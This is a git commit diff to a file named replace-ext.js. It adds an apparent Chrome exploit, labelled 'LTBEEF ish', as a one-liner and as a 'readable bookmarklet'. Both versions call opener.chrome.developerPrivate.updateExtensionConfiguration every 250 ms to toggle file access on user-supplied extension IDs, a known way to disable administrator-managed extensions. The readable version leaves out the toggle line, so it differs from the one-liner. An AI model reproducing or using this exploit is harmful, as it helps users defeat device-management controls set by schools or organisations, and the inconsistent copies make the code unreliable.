750adbb7af4d2423db68c3ad263b7ec6154d7221
qDread-dev <58754377+qDread-dev@users.noreply.github.com>
2022-12-16 11:55:30 -0500

    Update

--- replace-ext.js
+++ replace-ext.js
@@ -9,3 +9,18 @@ e.removeChild(opener.document.body);
 //      <h2 id="app-title" class="items-container">Chrome Apps</h2>
 var e = opener.document.getElementById('app-title');
 e.innerHTML = "POC";
+
+//Point blank explot - LTBEEF ish (NOT MADE BY ME)
+let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 250);
+
+//Readable bookmarklet
+let shim = false;
+var ids = prompt("extension ids (comma separated)").split(",");
+setInterval(()=>{
+    ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({
+        extensionId: id,
+        fileAccess: shim
+    }));
+},
+250)
+
